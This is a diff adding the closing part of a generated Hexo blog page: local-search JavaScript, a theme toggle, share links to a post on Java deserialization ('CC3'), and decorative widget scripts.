+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F25%2Fjava%25E5%25AE%2589%25E5%2585%25A8%25E6%25BC%25AB%25E8%25B0%2588%25E8%25A7%2582%25E5%2590%258E%25E6%2584%259F(%25E5%2585%25AD)-CC3%25E7%25AF%2587%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
